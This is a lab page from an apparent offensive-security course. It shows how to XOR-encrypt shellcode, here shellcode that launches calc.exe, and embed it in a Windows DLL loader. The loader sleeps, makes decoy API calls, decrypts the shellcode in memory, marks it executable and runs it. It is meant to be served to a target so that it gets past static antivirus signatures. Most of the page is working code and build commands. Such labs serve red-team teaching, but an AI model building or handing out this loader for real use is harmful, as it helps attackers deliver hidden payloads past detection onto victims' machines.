---
showTableOfContents: true
title: "Implementing Runtime Shellcode Decryption (Lab 9.2)"
type: "page"
---
## Goal
In this lab we'll implement obfuscation on the level of our payload. Specifically we'll:
- Create a XOR encryption application to obfuscate our shellcode prior to embedding it in our DLL
- We'll also give our DLL a function to decrypt the shellcode immediately prior to execution

## Code: Offline Obfuscator
Note that I'm providing it here as a Go program for consistency, but in all honesty for a job like this I would typically lean towards a Python script - simple, easy, single-serving utility. So feel free to recreate this in Python if that's what you'd prefer, it obviously does not impact the outcome.

```go
package main

import "fmt"

func main() {
	shellcode := []byte{
		0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
		0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
		0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
		0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
		0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
		0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
	}

	// XOR key
	key := []byte{0xDE, 0xAD, 0xC0, 0xDE}
	keyLen := len(key)

	// Create a slice to hold the encrypted shellcode.
	// Pre-allocating with make is efficient as we know the final size.
	encryptedShellcode := make([]byte, len(shellcode))

	// Perform XOR encryption
	for i := 0; i < len(shellcode); i++ {
		encryptedByte := shellcode[i] ^ key[i%keyLen]
		encryptedShellcode[i] = encryptedByte
	}

	// --- Print in C array format ---

	fmt.Println("unsigned char calc_shellcode[] = {")

	// Iterate through the encrypted shellcode for printing
	for i, b := range encryptedShellcode {
		// Add a newline every 15 bytes, but not at the very beginning
		if i%15 == 0 && i != 0 {
			fmt.Println() // Print a newline
		}
		// Print the byte in 0xXX format, followed by a comma and space
		fmt.Printf("0x%02X, ", b)
	}

	// Print the closing brace and a final newline
	fmt.Println("\n};")

}

```

**NOTE:** I'm not going to provide a code breakdown here since it's very simple + I've added extensive comments at just about every step to explain what's being done.


## Results: Offline Obfuscator

After running this application the new output we should place in our DLL will be printed to terminal in the format we require.
```shell
go run .
unsigned char calc_shellcode[] = {
0x8E, 0xFC, 0x92, 0x8D, 0x88, 0xFA, 0x95, 0xB4, 0xBE, 0xF7, 0xA8, 0xBD, 0xBF, 0xC1, 0xA3, 
0x8A, 0x87, 0xE5, 0x43, 0x32, 0xF6, 0xC8, 0x88, 0x55, 0xEC, 0xE5, 0x4B, 0xA8, 0xC6, 0xE5, 
0x4B, 0xA8, 0xCE, 0xE5, 0x6D, 0x96, 0x55, 0x9D, 0x88, 0x55, 0xA0, 0x9D, 0xC3, 0x89, 0xE2, 
0x26, 0x9C, 0xC9, 0xF6, 0x26, 0xB4, 0xC1, 0xFE, 0xE5, 0xC1, 0x20, 0x55, 0xF9, 0xDF, 0xFA, 
0xD1, 0x1A, 0xEC, 0xC9, 0x53, 0xFF, 0xC2, 0x73, 0x5F, 0x91, 0xC7, 0x89, 0xB7, 0xC3, 0x85, 
0xAB, 0x31, 0x26, 0xB4, 0xC1, 0xC2, 0xE5, 0xC1, 0x20, 0x55, 0x99, 0x6E, 0x96, 0xDF, 0x5A, 
0x59, 0x21, 0x09, 0xE5, 0x43, 0x1A, 0xEE, 0xF0, 0x9F, 0x80, 0x85, 0xF7, 0x99, 0x86, 0x1D, 
};
```


## Code: Updated calc_dll.cpp

We can now now add our new obfuscated shellcode + decryption function to our DLL. Let's pick up from the code exactly as it following Lab 9.1.

```go
#include <windows.h>

// NEW ENCRYPTED SHELLCODE C+P HERE
unsigned char calc_shellcode[] = {
0x8E, 0xFC, 0x92, 0x8D, 0x88, 0xFA, 0x95, 0xB4, 0xBE, 0xF7, 0xA8, 0xBD, 0xBF, 0xC1, 0xA3,
0x8A, 0x87, 0xE5, 0x43, 0x32, 0xF6, 0xC8, 0x88, 0x55, 0xEC, 0xE5, 0x4B, 0xA8, 0xC6, 0xE5,
0x4B, 0xA8, 0xCE, 0xE5, 0x6D, 0x96, 0x55, 0x9D, 0x88, 0x55, 0xA0, 0x9D, 0xC3, 0x89, 0xE2,
0x26, 0x9C, 0xC9, 0xF6, 0x26, 0xB4, 0xC1, 0xFE, 0xE5, 0xC1, 0x20, 0x55, 0xF9, 0xDF, 0xFA,
0xD1, 0x1A, 0xEC, 0xC9, 0x53, 0xFF, 0xC2, 0x73, 0x5F, 0x91, 0xC7, 0x89, 0xB7, 0xC3, 0x85,
0xAB, 0x31, 0x26, 0xB4, 0xC1, 0xC2, 0xE5, 0xC1, 0x20, 0x55, 0x99, 0x6E, 0x96, 0xDF, 0x5A,
0x59, 0x21, 0x09, 0xE5, 0x43, 0x1A, 0xEE, 0xF0, 0x9F, 0x80, 0x85, 0xF7, 0x99, 0x86, 0x1D,
};


BOOL ExecuteShellcode() {
	DWORD oldProtect = 0;

    // Define the XOR key used for encryption
    unsigned char xor_key[] = { 0xDE, 0xAD, 0xC0, 0xDE };
    size_t key_len = sizeof(xor_key);


    void* exec_memory = VirtualAlloc(NULL, sizeof(calc_shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);

    if (exec_memory == NULL) {
        return FALSE;
    }

	// we copy ENCRYPTED shellcode into memory
    memcpy(exec_memory, calc_shellcode, sizeof(calc_shellcode));

    // Misdirection: Call some common, low-impact APIs
    DWORD tickCount = GetTickCount();
    SYSTEMTIME sysTime;
    GetSystemTime(&sysTime);

    // Delay: Pause execution for a short period
    Sleep(2000); // Sleep for 2 seconds (Adjust as needed)


    // NOW, we DECRYPT the shellcode in the allocated buffer
    unsigned char* p_mem = (unsigned char*)exec_memory;
    for (size_t i = 0; i < sizeof(calc_shellcode); ++i) {
       p_mem[i] = p_mem[i] ^ xor_key[i % key_len]; // XOR each byte
    }


    // Change memory protection to RX before execution
    if (!VirtualProtect(exec_memory, sizeof(calc_shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        // Handle VirtualProtect error (e.g., print GetLastError())
        VirtualFree(exec_memory, 0, MEM_RELEASE); // Clean up allocated memory
        return FALSE;
    }

    void (*shellcode_func)() = (void(*)())exec_memory;

    shellcode_func();

    // (Optional but Recommended) Restore original permissions before freeing
    DWORD dummyProtect; // We don't care about the 'old' protection on this call
    VirtualProtect(exec_memory, sizeof(calc_shellcode), oldProtect, &dummyProtect);

    VirtualFree(exec_memory, 0, MEM_RELEASE);
    return TRUE;
}

extern "C" {
    __declspec(dllexport) BOOL LaunchCalc() {
        return ExecuteShellcode();
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```


## Code Breakdown
- The first change of course is that we've replaced `calc_shellcode[]` with the terminal output we generated above.
- Inside of our function we define both our key `xor_key[]`, which of course has to be the exact same as the one we used to generated the obfuscated shellcode, as well `key_len`, which we'll need for the `for` loop we're going to use to decrypt
- Take note that when we use `memcpy`, this is of course still the encrypted code. I just wanted to point that out - we are decrypting in-memory.
- Right below `Sleep()` we define `p_mem`, followed by a `for`-loop - this is where decryption takes place.
- And the rest of the code stays the exact same

## Instructions

We’ll need to recompile our DLL.

On Darwin (Mac OS):

```
x86_64-w64-mingw32-g++ calc_dll.cpp -o calc_dll.dll -shared -static-libgcc -static-libstdc++ -luser32
```

On Windows:

```
cl.exe /D_USRDLL /D_WINDLL calc_dll.cpp /link /DLL /OUT:calc_dll.dll
```

On Linux:

```
g++ -shared -o calc_dll.dll calc_dll.cpp -Wl,--out-implib,libcalc_dll.a
```

Then, follow the exact same instructions from Lab 9.1 - we’ll once again run our server, and then the client/loader. The only difference now of course is that the server will serve this new dll with our encrypted shellcode, and on the target-side we decrypt in-memory.

## Results

The output should be unchanged from Lab 9.1. Since the major changes - encrypted shellcode + in-memory decryption - are hidden from us, we should see the same console output as before, along with `calc.exe` running successfully.


## Discussion
We have successfully added a layer of obfuscation to our payload delivery. By storing the shellcode encrypted within the DLL and decrypting it only in memory during execution, we've defeated basic static signature scanning of the DLL file itself.

However, it's important to recognize the limitations of this specific implementation:

- **Simple XOR:** As discussed in Theory 9.3, XOR is cryptographically weak.
- **Hardcoded Key:** The XOR key is stored directly in the DLL's code. An analyst examining the `ExecuteShellcode` function in a disassembler could likely identify the decryption loop and the hardcoded key relatively easily, allowing them to manually decrypt the blob.

Despite these weaknesses, this lab demonstrates the fundamental _workflow_ of runtime decryption. To improve this, one could:

- Use a stronger algorithm like AES (requiring a C/C++ crypto library or Windows CNG API calls).
- Employ more sophisticated key management (dynamically generating the key at runtime instead of hardcoding it, just as we did before).

## Conclusion

We've integrated runtime decryption into our shellcode execution process, enhancing the DLL's resilience against static signature detection. Next, let's discuss one final concept related to how we may refine our current in-process evasion strategy.


---
[|TOC|]({{< ref "../moc.md" >}})
[|PREV|]({{< ref "encrypt.md" >}})
[|NEXT|]({{< ref "thread.md" >}})